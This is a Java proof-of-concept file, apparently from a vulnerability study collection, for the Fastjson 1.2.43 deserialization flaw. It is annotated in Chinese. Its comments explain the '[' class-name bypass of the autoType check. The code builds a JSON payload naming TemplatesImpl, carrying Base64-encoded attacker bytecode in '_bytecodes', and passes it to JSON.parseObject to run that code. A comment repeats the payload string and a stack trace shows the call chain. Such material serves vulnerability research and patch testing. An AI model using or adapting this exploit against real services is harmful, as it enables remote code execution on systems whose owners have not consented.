package org.example.no1;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

/**
 * Fastjson 1.2.43 版本的反序列化漏洞
 * <br>
 * 两个条件：
 * <br>
 1. fastjson.parser.autoTypeSupport 需要在fastjson.properties中配置为true （开启autotype）
 <p>
 2. 利用 [ 绕过
 </p>

 <p>
 与上个版本区别：
 修复了双写绕过的问题，如果类名存在两个'['会抛出异常
 </p>
 <p>
 {"@type":"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"[{"_bytecodes":["xxx"],'_name':'a.b','_tfactory':{},"_outputProperties":{ },,"_version":"1.0","allowedProtocols":"all"]
 </p>
 *
 **/
public class PoC3_1_2_43 {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }
    public static void main(String args[]){
        try {
            String classFilePath = "CalcTest.class";
            String evilCode = readClass(classFilePath);
            final String NASTY_CLASS =
                    "[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\"@type\":\"" + NASTY_CLASS +
                    "\"[{\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{},\"_outputProperties\":{ }," +
                ",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"]\n";

            System.out.println(text1);
            Object obj = JSON.parseObject(text1, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    /**
     * 调用链
     * at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:458)
     * 	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:485)
     * 	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:506)
     * 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
     * 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
     * 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
     * 	at java.lang.reflect.Method.invoke(Method.java:498)
     * 	at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:85)
     * 	at com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:83)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:773)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:600)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:188)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184)
     * 	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368)
     * 	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.deserialze(JavaObjectDeserializer.java:45)
     * 	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:639)
     * 	at com.alibaba.fastjson.JSON.parseObject(JSON.java:339)
     * 	at com.alibaba.fastjson.JSON.parseObject(JSON.java:243)
     * 	at org.example.no1.PoC1.main(PoC1.java:34)
     */
}